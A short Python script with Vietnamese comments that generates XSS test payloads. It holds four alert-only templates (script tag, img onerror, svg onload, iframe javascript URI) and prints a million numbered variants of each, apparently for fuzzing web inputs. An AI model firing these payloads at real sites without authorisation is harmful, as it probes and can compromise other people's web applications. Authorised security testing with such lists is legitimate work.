# Tạo các biến thể payload cơ bản
base_payloads = [
    "<script>alert({})</script>",
    "<img src=x onerror=alert({})>",
    "<svg onload=alert({})>",
    "<iframe src='javascript:alert({})'>",
]

# Sinh nhiều payload
for i in range(1000000):  # Điều chỉnh giới hạn theo nhu cầu
    for payload in base_payloads:
        print(payload.format(i))
